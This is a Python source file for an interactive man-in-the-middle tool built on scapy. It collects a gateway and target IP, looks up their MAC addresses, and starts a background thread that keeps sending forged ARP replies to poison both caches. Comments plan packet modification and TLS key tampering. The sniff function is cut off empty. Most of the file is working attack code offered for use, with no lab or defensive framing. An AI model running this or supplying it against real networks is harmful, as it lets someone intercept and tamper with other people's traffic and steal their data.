from types import NoneType
from scapy.all import *
import os
from termcolor import colored
import threading
import sys

# 1. Allow packet by packet transfer
# Add packet modfication
# Add ssl/tls key modification

class Mitm:
    def __init__(self):
        self.menu = f"MITM Menu  \nPlease Select your choice\n1. Setup   2. Start\n3.Sniff   4.Exit "
        
        self.router_ip = ""
        self.target_ip = ""
        self.router_mac = ""
        self.target_mac = ""

        self.active = False

        self.setupmenu = f"Gateway IP Address: {self.router_ip}\nTarget IP Address: {self.target_ip}"
        self.attack_thread = None

        conf.verb = 0

    def setup(self):
        # Menu Section
        print(colored(self.setupmenu, "red"))
        self.router_ip = input("Enter Gateway IP Address: ")
        os.system("clear")
        print(colored(f"Gateway IP Address: {self.router_ip}\nTarget IP Address: {self.target_ip}", "red"))
        self.target_ip = input("Enter Target IP address: ")
    
    def attack(self):
        self.router_mac, self.target_mac = self.get_mac()
        self.active = True

        while self.active:
            target_arp = ARP(op=2, pdst=self.target_ip, psrc=self.router_ip, hwdst=self.target_mac)
            router_arp = ARP(op=2, pdst=self.router_ip, psrc=self.target_ip, hwdst=self.router_mac)
            sendp(target_arp, verbose=False)
            sendp(router_arp, verbose=False)
            time.sleep(1)

    def get_mac(self):
        router_packet = ARP(pdst=self.router_ip)
        target_packet = ARP(pdst=self.target_ip)
        router_response = sr1(router_packet, timeout=2)
        target_response = sr1(target_packet, timeout=2)
        router_mac = router_response.hwsrc
        target_mac = target_response.hwsrc
        return router_mac, target_mac

    def loop(self):
        os.system("clear")
        print(colored(self.menu, "red"))
        # check if attack mitm is active yet
        if self.active:
            print("MITM is active")
        else:
            print("MITM is not active")
        choice = int(input())
        match choice:
            case 1:
                os.system("clear")
                self.setup()
                self.loop()
            case 2:
                os.system("clear")
                self.attack_thread = threading.Thread(target=self.attack, daemon=True)
                self.attack_thread.start()
                self.loop()
            case 3:
                self.sniff()
            case 4:
                return 0
        
    def sniff(self):

